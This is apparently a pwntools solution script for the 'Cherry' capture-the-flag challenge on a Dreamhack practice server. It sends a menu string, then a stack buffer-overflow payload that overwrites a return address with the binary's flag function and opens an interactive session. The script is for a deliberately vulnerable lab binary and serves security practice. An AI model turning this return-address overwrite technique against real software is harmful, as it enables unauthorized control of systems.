from pwn import *

port = 17144
rem = remote("host3.dreamhack.games", port)

elf = ELF("./Pwnable/Cherry/problem/chall")

payload = b'cherry'
payload += b'A' * 7

rem.sendlineafter(b"Menu: ", payload)

flag_addr = elf.symbols['flag']
payload = b'B' * 0x1a
payload += p64(flag_addr)

rem.recvn(15)
rem.sendline(payload)

rem.interactive()